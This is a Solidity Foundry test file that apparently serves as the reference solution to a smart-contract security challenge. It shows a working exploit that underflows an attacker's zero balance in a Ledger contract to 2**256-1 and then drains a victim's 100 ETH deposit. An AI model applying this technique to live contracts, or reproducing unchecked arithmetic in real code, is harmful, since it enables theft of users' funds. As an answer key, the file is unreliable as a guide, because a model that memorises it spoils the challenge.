// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {Ledger} from "../src/Ledger.sol";

/// Reference exploit: underflow the attacker's balance, then drain the pool.
contract ArithmeticSolution is Test {
    Ledger ledger;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        ledger = new Ledger();
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        ledger.deposit{value: 100 ether}();
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        // 1. Transfer 1 wei while holding a zero balance -> unchecked underflow
        //    sets balanceOf[attacker] to 2**256 - 1.
        ledger.transfer(victim, 1);
        // 2. The contract holds the victim's 100 ETH; withdraw all of it.
        ledger.withdraw(100 ether);
        vm.stopPrank();

        assertEq(attacker.balance, 100 ether, "attacker should drain the pool");
    }
}
